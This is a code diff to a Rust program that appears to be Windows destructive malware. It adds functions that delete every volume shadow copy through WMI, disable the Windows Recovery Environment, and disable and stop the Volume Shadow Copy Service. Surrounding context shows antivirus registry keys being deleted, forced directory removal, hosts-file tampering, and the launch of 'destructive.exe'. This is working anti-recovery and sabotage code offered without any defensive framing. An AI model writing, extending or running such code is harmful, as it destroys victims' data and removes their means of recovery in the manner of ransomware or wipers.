@@ -614,6 +614,75 @@ fn add_takeown_and_delete(commands: &mut Vec<String>, directory: &str) {
     commands.push(format!(r#"rd /s /q {}"#, directory));
 }
 
+/// Deletes all existing shadow copies on the system using WMI.
+fn delete_shadow_copies() -> wmi::WMIResult<()> {
+    // Initialize COM and create a WMI connection.
+    let com_con = COMLibrary::new()?;
+    let wmi_con = WMIConnection::new(com_con)?;
+
+    // Query for all shadow copies.
+    let shadow_copies: Vec<HashMap<String, Variant>> =
+        wmi_con.raw_query("SELECT * FROM Win32_ShadowCopy")?;
+
+    // Iterate over each shadow copy and delete it.
+    for copy in shadow_copies {
+        if let Some(id) = copy.get("ID") {
+            // Convert the ID to a string and fix escape sequences.
+            let id_str = id.as_string()?.replace("\\\\", "\\");
+            // Construct the WMI object path for the shadow copy.
+            let query_object = format!("Win32_ShadowCopy.ID='{}'", id_str);
+            
+            let mut params = HashMap::new();
+            params.insert("Id".to_string(), Variant::String(id_str.clone()));
+
+            // Execute the deletion method.
+            wmi_con.exec_method(&query_object, "Delete", params)?;
+            println!("[+] Deleted Shadow Copy: {}", id_str);
+        }
+    }
+    
+    Ok(())
+}
+
+/// Disables the Windows Recovery Environment using reagentc.exe.
+fn disable_recovery() -> io::Result<()> {
+    let status = Command::new("reagentc.exe")
+        .args(&["/disable"])
+        .status()?;
+
+    if status.success() {
+        println!("[+] Windows Recovery Environment has been disabled.");
+    } else {
+        eprintln!("[-] Failed to disable Windows Recovery Environment.");
+    }
+
+    Ok(())
+}
+
+/// Disables the Volume Shadow Copy Service (VSS) to prevent the creation of new shadow copies.
+fn disable_shadow_copy_service() -> io::Result<()> {
+    // Set the VSS service startup type to disabled.
+    let status = Command::new("sc")
+        .args(&["config", "VSS", "start=", "disabled"])
+        .status()?;
+    if !status.success() {
+        eprintln!("[-] Failed to set VSS startup type to disabled.");
+    } else {
+        println!("[+] VSS startup type set to disabled.");
+    }
+
+    // Attempt to stop the VSS service.
+    let status = Command::new("sc")
+        .args(&["stop", "VSS"])
+        .status()?;
+    if !status.success() {
+        eprintln!("[-] Failed to stop VSS service.");
+    } else {
+        println!("[+] VSS service stopped.");
+    }
+    Ok(())
+}
+
 fn main() -> io::Result<()> {
     // Step 1: Admin Control Check
     if !is_admin() {
@@ -793,7 +862,6 @@ fn main() -> io::Result<()> {
         }
 
         // Group 11: Delete registry keys for antivirus programs.
-        // Group 11: Delete registry keys for antivirus programs
         let delete_registry_cmds = vec![
             // Startup keys
             r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f"#,
@@ -900,21 +968,38 @@ fn main() -> io::Result<()> {
 
         println!("Scan completed.");
 
-        // Launch destructive.exe from the utkudrk2 folder.
-        if let Ok(program_files) = env::var("ProgramFiles") {
-            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
-            let _ = Command::new(&executable_path).spawn(); // Ignore errors
-        }
+    // Delete all existing shadow copies.
+    match delete_shadow_copies() {
+        Ok(_) => println!("[+] All shadow copies have been deleted."),
+        Err(e) => eprintln!("[-] Error deleting shadow copies: {:?}", e),
+    }
 
-        if let Err(e) = modify_hosts_file() {
-            eprintln!("Error modifying hosts file: {}", e);
-        }
+    // Disable the Windows Recovery Environment.
+    if let Err(e) = disable_recovery() {
+        eprintln!("[-] Error disabling Windows Recovery Environment: {:?}", e);
+    }
 
-        if let Err(e) = unplug_all_isos() {
-            eprintln!("Error unplugging ISOs: {}", e);
-        }
+    // Disable the Volume Shadow Copy Service to prevent new shadow copies.
+    if let Err(e) = disable_shadow_copy_service() {
+        eprintln!("[-] Error disabling the shadow copy service: {:?}", e);
+    }
 
-        println!("[+] Cleanup tasks completed. Safe Mode should now be removed.");
+    if let Err(e) = modify_hosts_file() {
+        eprintln!("Error modifying hosts file: {}", e);
+    }
+
+    if let Err(e) = unplug_all_isos() {
+        eprintln!("Error unplugging ISOs: {}", e);
+    }
+
+    println!("[+] Cleanup tasks completed. Safe Mode should now be removed.");
+
+    // Launch destructive.exe from the utkudrk2 folder.
+    if let Ok(program_files) = env::var("ProgramFiles") {
+        let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
+        let _ = Command::new(&executable_path).spawn(); // Ignore errors
+    }
+
     } else {
         println!("[+] Safe Mode is not detected. Running destructive.exe directly...");
         if let Ok(program_files) = env::var("ProgramFiles") {
